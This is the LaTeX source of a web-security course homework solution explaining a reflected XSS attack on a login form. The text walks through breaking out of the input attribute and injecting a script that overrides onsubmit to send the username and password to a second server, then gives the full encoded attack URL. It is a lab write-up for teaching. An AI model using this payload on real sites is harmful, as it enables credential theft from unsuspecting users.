\documentclass[12pt]{scrartcl}

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{graphicx}
%\usepackage[pdftex,hyperref,dvipsnames]{xcolor}
\usepackage{listings}
\usepackage[a4paper,lmargin={2cm},rmargin={2cm},tmargin={3.5cm},bmargin = {2.5cm},headheight = {4cm}]{geometry}
\usepackage{amsmath,amssymb,amstext,amsthm}
% \usepackage[lined,algonl,boxed]{algorithm2e} 
%\usepackage{algpseudocode}
\usepackage{tikz}
\usepackage{pgfplots}
\usepackage{url}
\usepackage{tcolorbox}
\usepackage[inline]{enumitem}
\usepackage[headsepline]{scrlayer-scrpage} 
\usepackage{float}
\usepackage{hyperref}

\usepackage[scale=0.55, lineVdist=1em]{secstack}
\pagestyle{scrheadings} 
\usetikzlibrary{automata,positioning}
\graphicspath{ {./images/} }

\usepgfplotslibrary{external}
%\tikzexternalize
\pgfplotsset{width=10cm,compat=1.9}
\pgfplotsset{every axis/.style={
    axis line style = thick,
    grid = both,
    tick pos = left,
    tick align = outside,
    tick style = {thick,black},
    fill = blue,
	line width = 2pt,
}}

\lstset{
  basicstyle=\ttfamily\small,
  numbers=left,
  numberstyle=\tiny,
  stepnumber=1,
  numbersep=8pt,
  frame=single,
  breaklines=true,
  columns=fullflexible
}

\lstset{
  language=C,
  basicstyle=\ttfamily\small,
  keywordstyle=\color{blue},
  commentstyle=\color{gray},
  stringstyle=\color{green!60!black},
  numbers=left,
  numberstyle=\tiny,
  stepnumber=1,
  numbersep=8pt,
  frame=single,
  breaklines=true,
  columns=fullflexible
}

\lstset{
    escapeinside={(*@}{@*)}
}

\renewcommand{\theenumi}{(\alph{enumi})}
\renewcommand{\labelenumi}{\text{\theenumi}}
\renewcommand{\labelenumii}{(\roman{enumii})} 

\ohead{Marvin Simon (3883376)\\
       Jan Theil (3794698)}

\ihead{System and Web Security}

\newcounter{exnum}
\newcommand{\exercise}[1]{\section*{Problem \theexnum\stepcounter{exnum}: #1}}

\begin{document}

\setcounter{exnum}{2}
\exercise{Stealing Form Data With XSS}

First, let us have a look at the problematic line in the python code:
\begin{lstlisting}
Username: <input type="text" name="uname" id="uname" value="{uname}"><br>
\end{lstlisting}
With the GET parameter \textit{uname} we can inject HTML (and therefore JavaScript) code by crafting a specific URL (reflected XSS).

We did this in the following steps (for readability we will not repeatedly print the IP to localhost, instead the placeholder \texttt{...} is used):
\begin{enumerate}[label=\arabic*.]
  \item To inject a \texttt{<script>}-block, we first need to escape the \texttt{<input>}-tag where the value of the parameter is inputted.
        This is done by starting with \texttt{...?uname=">}. This gives us:
        \begin{lstlisting}
Username: <input type="text" name="uname" id="uname" value="(*@\textcolor{red}{">}@*)"><br>
        \end{lstlisting}
  \item Now we can inject the \texttt{<script>}-block. The goal is to overwrite the \texttt{submit} function of the form and send the
        inputted values to some other server (in our case just \textit{localhost:8082} but it can be arbitrary). For this we used
        \texttt{document.forms[0].onsubmit = function() \{...\}}. Within this function block the context of \texttt{this} is the form itself.
        Hence, we can use \texttt{this.<field>.value} to obtain the values from the form, forge a request URL with these values and open 
        a new window with \texttt{window.open} to send these values to our server. This is done by the following JS code:
        \begin{lstlisting}
<script>
  document.forms[0].onsubmit = function() {
  let req = `http://localhost:8082?name=${this.uname.value}&pass=${this.password.value}`;
  window.open(req);}
</script>
        \end{lstlisting}
  \item Now we have something like this:
  \begin{lstlisting}
Username: <input type="text" name="uname" id="uname" value="(*@\textcolor{red}{"><script>...</script>}@*)"><br>
  \end{lstlisting}
  The final thing left to do is to remove all visual indicators of document manipulation. We have done this by ending the \texttt{uname}
  parameter with \texttt{<br style="display:none} to get rid of the dangling \texttt{>} which is breaking our document structure. Therefor,
  we get this:
  \begin{lstlisting}
    Username: <input type="text" name="uname" id="uname"
    value="(*@\textcolor{red}{\ttfamily"><script>...</script><br style="display:none>}@*)"><br>
  \end{lstlisting}
\end{enumerate}

The final forged URL is
\url{http://localhost:8081/?uname="><script>document.forms[0].%20onsubmit=function()%20{%20let%20req%20=%20`http://localhost:8082?name=${this.uname.value}%26pass=${this.password.value}`;%20window.open(req);}</script><br%20style="display:none}.
Notice how we have also used the appropriate HTML encodings for special symbols.

% http://localhost:8081/?uname=">
% <script>
% document.forms[0].onsubmit = function() {
%   let req = `http://localhost:8082?name=${this.uname.value}%26pass=${this.password.value}`;
%   window.open(req);}
% </script>
% <br style="display:none

\end{document}
